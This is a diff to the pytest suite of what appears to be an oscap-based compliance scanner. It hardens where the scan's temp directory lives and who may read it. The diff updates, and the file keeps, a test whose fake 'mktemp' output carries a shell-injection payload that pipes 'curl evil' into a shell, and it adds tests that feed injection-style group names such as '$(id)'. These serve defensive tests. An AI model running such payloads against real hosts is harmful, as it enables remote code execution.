@@ -30,14 +30,14 @@ def test_malicious_mktemp_output_is_refused(tmp_path):
     # A compromised target whose `mktemp` emits a shell-injection payload must be
     # refused before that string can reach a sudo command -- not run as root.
     conn = FakeRemoteHost(responses=[
-        ("mktemp", CommandResult(0, "/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
+        ("mktemp", CommandResult(0, "/var/lib/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
     ])
     host = HostRecord(ip="10.0.0.9")
     with pytest.raises(ScanFailed) as caught:
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
     assert "unexpected path" in caught.value.detail
     # Refused before any sudo command: only mktemp ran.
-    assert conn.commands == ["mktemp -d /tmp/grc_audit.XXXXXX"]
+    assert conn.commands == ["mktemp -d /var/lib/grc_audit.XXXXXX"]
     assert host.status is HostStatus.DISCOVERED   # assess records the verdict
 
 
@@ -45,7 +45,8 @@ def test_scan_host_happy_path_returns_a_certifiable_scan(tmp_path):
     results_xml = open(fixture_path("xccdf-results.xml"), encoding="utf-8").read()
     conn = FakeRemoteHost(
         responses=[
-            ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+            ("mktemp", CommandResult(0, "/var/lib/grc_audit.Ab3xZ9", "")),
+            ("id -gn", CommandResult(0, "grc-scan", "")),
             ("xccdf eval", CommandResult(0, "", "")),
             ("test -f", CommandResult(0, "", "")),
         ],
@@ -60,7 +61,8 @@ def test_scan_host_happy_path_returns_a_certifiable_scan(tmp_path):
 
 def test_scan_host_oscap_error_marks_scan_error(tmp_path):
     conn = FakeRemoteHost(responses=[
-        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+        ("mktemp", CommandResult(0, "/var/lib/grc_audit.Ab3xZ9", "")),
+        ("id -gn", CommandResult(0, "grc-scan", "")),
         ("xccdf eval", CommandResult(1, "", "bad profile")),
     ])
     host = HostRecord(ip="10.0.0.9")
@@ -73,7 +75,8 @@ def test_scan_host_oscap_error_marks_scan_error(tmp_path):
 def test_scan_host_no_results_file_marks_scan_error(tmp_path):
     # oscap exited success but produced no results.xml -> a gap, not a clean pass.
     conn = FakeRemoteHost(responses=[
-        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+        ("mktemp", CommandResult(0, "/var/lib/grc_audit.Ab3xZ9", "")),
+        ("id -gn", CommandResult(0, "grc-scan", "")),
         ("xccdf eval", CommandResult(0, "", "")),
         ("test -f", CommandResult(1, "", "")),
     ])
@@ -82,7 +85,7 @@ def test_scan_host_no_results_file_marks_scan_error(tmp_path):
         scan_host(host, conn, _plan(), "runid", str(tmp_path))
     assert caught.value.detail == (
         "oscap exited 0 but produced no results.xml at "
-        "/tmp/grc_audit.Ab3xZ9/results.xml (see oscap.stderr.txt)"
+        "/var/lib/grc_audit.Ab3xZ9/results.xml (see oscap.stderr.txt)"
     )
 
 
@@ -162,7 +165,7 @@ def test_scan_host_honors_plan_sudo_false(tmp_path):
         '</TestResult>\n'
     )
     conn = _SudoRecordingHost(
-        responses=[("mktemp", CommandResult(0, "/tmp/grc_audit.abc123", ""))],
+        responses=[("mktemp", CommandResult(0, "/var/lib/grc_audit.abc123", ""))],
         files={"results.xml": results_xml, "arf.xml": "<x/>", "report.html": "<html/>"},
     )
     plan = ScanPlan(datastream_path="/ds.xml", profile_id="p", cis_level=1,
@@ -173,6 +176,90 @@ def test_scan_host_honors_plan_sudo_false(tmp_path):
     rm = [(c, s) for c, s in conn.sudo_by_cmd if c.startswith("rm -rf")]
     assert oscap and all(s is False for _, s in oscap)   # oscap ran without sudo
     assert rm and all(s is False for _, s in rm)          # cleanup too
+    mk = [(c, s) for c, s in conn.sudo_by_cmd if c.startswith("mktemp")]
+    assert mk and all(s is False for _, s in mk)          # root login: no sudo
+    # Root reads its own 0700 dir, so there is nothing to open up.
+    assert not [c for c, _ in conn.sudo_by_cmd if c.startswith(("id ", "chgrp", "chmod"))]
+
+
+# --- review findings grc-r2-1 and grc-r3-1: root owns the dir oscap writes
+# into, and only root and the scan account can read it ----------------------
+
+_DIR = "/var/lib/grc_audit.Ab3xZ9"
+_FILES = {"results.xml": ('<?xml version="1.0"?>\n'
+                          '<TestResult xmlns="http://checklists.nist.gov/xccdf/1.2">\n'
+                          '  <rule-result idref="r1"><result>pass</result></rule-result>\n'
+                          '</TestResult>\n'),
+          "arf.xml": "<x/>", "report.html": "<html/>"}
+_MK = "mktemp -d /var/lib/grc_audit.XXXXXX"
+
+
+def test_scan_host_has_root_create_the_dir_and_share_it_with_the_scan_group(tmp_path):
+    # The scan user can plant symlinks in a dir it owns, so root makes the dir,
+    # in /var/lib where only root can add entries. Root then hands it to the
+    # scan account's group read-only (0750) for the SFTP pull, before oscap.
+    conn = _SudoRecordingHost(responses=[("mktemp", CommandResult(0, _DIR, "")),
+                                         ("id -gn", CommandResult(0, "grc-scan\n", ""))],
+                              files=_FILES)
+    scan_host(HostRecord(ip="10.0.0.7"), conn, _plan(), "runid", str(tmp_path))
+    cmds = [c for c, _ in conn.sudo_by_cmd]
+    assert (_MK, True) in conn.sudo_by_cmd
+    assert ("id -gn", False) in conn.sudo_by_cmd
+    assert (f"chgrp grc-scan {_DIR}", True) in conn.sudo_by_cmd
+    assert (f"chmod 0750 {_DIR}", True) in conn.sudo_by_cmd
+    oscap_at = next(i for i, c in enumerate(cmds) if "oscap xccdf eval" in c)
+    assert (cmds.index(_MK) < cmds.index(f"chgrp grc-scan {_DIR}")
+            < cmds.index(f"chmod 0750 {_DIR}") < oscap_at)
+
+
+def test_scan_host_never_opens_the_dir_to_other_users(tmp_path):
+    # grc-r3-1: oscap's files are 0644 under sudo's umask, so the dir mode is
+    # the only thing keeping other local accounts out of the failed-control list.
+    conn = _SudoRecordingHost(responses=[("mktemp", CommandResult(0, _DIR, "")),
+                                         ("id -gn", CommandResult(0, "grc-scan", ""))],
+                              files=_FILES)
+    scan_host(HostRecord(ip="10.0.0.7"), conn, _plan(), "runid", str(tmp_path))
+    modes = [c.split()[1] for c, _ in conn.sudo_by_cmd if c.startswith("chmod")]
+    assert modes
+    for mode in modes:
+        assert int(mode, 8) & 0o007 == 0, mode
+
+
+@pytest.mark.parametrize("group", ["", "-R", "grc scan", "grc;rm", "root\nx", "$(id)"])
+def test_scan_host_refuses_a_bad_group_name_and_cleans_up(tmp_path, group):
+    conn = FakeRemoteHost(responses=[
+        ("mktemp", CommandResult(0, _DIR, "")),
+        ("id -gn", CommandResult(0, group, "")),
+    ])
+    with pytest.raises(ScanFailed) as caught:
+        scan_host(HostRecord(ip="10.0.0.9"), conn, _plan(), "runid", str(tmp_path))
+    assert "group" in caught.value.detail
+    assert not any(c.startswith(("chgrp", "chmod")) or "oscap" in c for c in conn.commands)
+    assert conn.commands[-1] == f"rm -rf {_DIR}"
+
+
+def test_scan_host_refuses_a_dir_outside_var_lib(tmp_path):
+    # The old /tmp location is one the scan user can create itself.
+    conn = FakeRemoteHost(responses=[
+        ("mktemp", CommandResult(0, "/tmp/grc_audit.Ab3xZ9", "")),
+    ])
+    with pytest.raises(ScanFailed) as caught:
+        scan_host(HostRecord(ip="10.0.0.9"), conn, _plan(), "runid", str(tmp_path))
+    assert "unexpected path" in caught.value.detail
+    assert len(conn.commands) == 1
+
+
+def test_scan_host_chmod_failure_is_scan_error_and_cleans_up(tmp_path):
+    conn = FakeRemoteHost(responses=[
+        ("mktemp", CommandResult(0, _DIR, "")),
+        ("id -gn", CommandResult(0, "grc-scan", "")),
+        ("chmod", CommandResult(1, "", "chmod: denied")),
+    ])
+    with pytest.raises(ScanFailed) as caught:
+        scan_host(HostRecord(ip="10.0.0.9"), conn, _plan(), "runid", str(tmp_path))
+    assert "temp dir" in caught.value.detail
+    assert not any("oscap" in c for c in conn.commands)
+    assert conn.commands[-1] == f"rm -rf {_DIR}"
 
 
 def test_notselected_heavy_scan_is_certified_scanned():
